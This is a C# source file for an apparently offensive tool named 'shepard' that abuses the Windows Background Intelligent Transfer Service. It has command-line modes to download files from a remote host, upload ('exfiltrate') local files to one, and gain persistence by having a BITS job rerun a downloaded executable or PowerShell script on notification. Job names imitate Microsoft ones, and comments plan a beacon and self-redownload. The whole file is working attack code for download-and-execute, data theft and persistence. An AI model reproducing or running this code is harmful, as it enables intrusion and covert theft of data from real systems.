using BITSReference1_5;
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using BITS = BITSReference1_5;


//add a beacon function somewhere in main ^
//redownload this executable and run again using bits, different job
//C:\Program Files\Common Files\microsoft shared\MSInfo\msinfo64.exe
namespace shepard
{
    class JobObj
    {
        static BITS.BackgroundCopyManager1_5 mgr;
        static BITS.GUID jobGuid;
        static BITS.IBackgroundCopyJob job;
        static JobObj jo;

        public JobObj()
        {
            mgr = new BITS.BackgroundCopyManager1_5();
        }

        public static void Main(string[] args)
        {
            if (args.Length == 0) { return; }

            jo = new JobObj();

            string switchCase = args[0];

            switch (switchCase)
            {
                case "-d":
                    if (args.Length == 3)
                    {
                        jo.downloadFile("Microsoft Example QD_1", args[1], args[2]);
                        break;
                    }
                    return;
                case "-e":
                    if (args.Length == 3)
                    {
                        jo.exfiltrateFile("Microsoft Example QE_1", args[1], args[2]);
                        break;
                    }
                    return;
                case "-dr":
                    if (args.Length == 4)
                    {
                        jo.persist(args[1], args[2], args[3]);
                        break;
                    }
                    else if (args.Length == 3)
                    {
                        jo.persist(args[1], args[2], "");
                        break;
                    }
                    return;
                default:
                    return;
            }

        }

        //Usage params: url or ip:port, full path
        private void downloadFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            //job.AddFile("https://aka.ms/WinServ16/StndPDF", @"C:\Users\student\Desktop\Server2016.pdf");
            //job.AddFile("23.52.161.19:443", @"C:\Users\student\Desktop\Server2016.pdf");
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();

        }

        //Usage params: url or ip:port, full path
        private void exfiltrateFile(string name, string remoteLoc, string writeLoc)
        {
            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
            job.AddFile(remoteLoc, writeLoc);
            jo.executeBITSJob();
        }

        //Default execution of a BITS Job, fully completes
        private void executeBITSJob()
        {
            job.Resume();
            bool jobIsFinal = false;
            while (!jobIsFinal)
            {
                BITS.BG_JOB_STATE state;
                job.GetState(out state);
                switch (state)
                {
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                        job.Complete();
                        break;
                        
                    case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                        jobIsFinal = true;
                        break;

                    default:
                        System.Threading.Thread.Sleep(500); // delay a little bit
                        break;
                }
            }
        }

        //Usage: BITS job name, file path, "file args"
        private void persist(string remote, string filePath, string cmdArgs)
        {
            string name = "Microsoft Example BD_1";
            jo.downloadFile(name, remote, filePath); //initial download, completes

            mgr.CreateJob(name, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
            
            job.AddFile(remote, filePath);
            jo.commandExec(job, filePath, cmdArgs);
            job.SetMinimumRetryDelay(10);
            
            job.Resume();
            //System.Threading.Thread.Sleep(1000);
            //job.Suspend();
        }

        private void commandExec(BITS.IBackgroundCopyJob job, string filename, string args)
        {
            string filepath;
            var job2 = job as BITS.IBackgroundCopyJob2;
            if (filename.Contains(".ps1"))
            {
                args = filename;
                filepath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            }else
            {
                filepath = filename;
            }
            job2.SetNotifyCmdLine(filepath, args);
        }

        
    }
}
